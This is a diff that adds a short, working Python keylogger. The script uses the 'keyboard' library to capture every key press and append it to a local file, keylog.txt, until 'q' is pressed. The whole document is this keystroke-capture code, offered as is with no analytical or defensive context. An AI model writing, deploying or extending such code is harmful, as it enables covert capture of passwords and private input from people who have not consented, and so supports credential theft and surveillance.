@@ -1,0 +1,16 @@
+import keyboard
+def keylogger():
+    log_file = "keylog.txt"
+    print("Keylogger started. Press 'q' to quit.")
+    with open(log_file, "a") as f:
+        while True:
+            key = keyboard.read_event()
+            if key.event_type == keyboard.KEY_DOWN:
+                if key.name == 'q':
+                    print("Keylogger stopped.")
+                    break
+                else:
+                    f.write(key.name)
+                    f.write("\n")
+if __name__ == "__main__":
+    keylogger()
